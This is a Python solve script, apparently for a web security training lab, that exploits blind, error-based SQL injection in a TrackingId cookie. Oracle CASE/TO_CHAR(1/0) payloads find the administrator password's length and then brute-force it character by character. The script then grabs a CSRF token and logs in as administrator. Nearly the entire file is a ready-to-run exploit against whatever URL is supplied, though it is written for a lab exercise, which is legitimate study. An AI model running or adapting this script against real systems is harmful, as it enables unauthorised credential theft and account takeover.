"""
  Lab: Blind SQL injection with conditional errors

  Steps:
  1. Inject payload into 'TrackingId' cookie to determine the length of administrator's password based on conditional errors
  2. Modify the payload to brute force the administrator's password
  3. Fetch the login page
  4. Extract the csrf token and session cookie
  5. Login as the administrator
  6. Fetch the administrator profile

  Author: D4mn20
"""
import argparse
import requests
from colorama import Fore
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")

    print(Fore.WHITE + "⦗1⦘ Determining password length.. ")
    
    password_length = determin_password_length(session, args.url)

    print(Fore.WHITE + "⦗2⦘ Brute forcing password.. ")
    
    admin_password = brute_force_password(password_length, session, args.url)

    print(Fore.WHITE + "\n⦗3⦘ Fetching the login page.. ", end="", flush=True)
   
    login_page = fetch("/login", session, args.url)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session_cookie = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Logging in as the administrator.. ", end="", flush=True)
    
    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session_cookie }
    admin_login = post_data("/login", data, cookies, session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", session, args.url, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def determin_password_length(session, url):
    for length in range(1, 50):
        print(Fore.WHITE + "❯❯ Checking if length = " + Fore.YELLOW + str(length), flush=True, end='\r')
        
        payload = f"' UNION SELECT CASE WHEN (length((select password from users where username = 'administrator')) = {length}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -"
        cookies = { "TrackingId": payload }
        injection_response = fetch("/filter?category=Pets", session, url, cookies)

        if injection_response.status_code == 500:
            print(Fore.WHITE + "❯❯ Checking if password length = " + Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " + Fore.GREEN + str(length) + Fore.WHITE + " ]")

            return length
        else:
            continue
    
    print(Fore.RED + "⦗!⦘ Failed to determine the length")
    exit(1)


def brute_force_password(password_length, session, url):
    correct_password = []

    for position in range(1, password_length+1):
        for character in "0123456789abcdefghijklmnopqrstuvwxyz":
            print(Fore.WHITE + "❯❯ Checking if char at position " + Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
            
            payload = f"' UNION SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {position}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -"
            cookies = { "TrackingId": payload }
            injection_response = fetch("/filter?category=Pets", session, url, cookies)

            if injection_response.status_code == 500:
                correct_password.append(character)
                
                print(Fore.WHITE + "❯❯ Checking if char at position " + Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " + Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')
                break
            else:
                continue
            
    return "".join(correct_password)


def fetch(path, session, url, cookies = None):
    try:  
        return session.get(f"{url}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies, session, url):
    try:    
        return session.post(f"{url}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()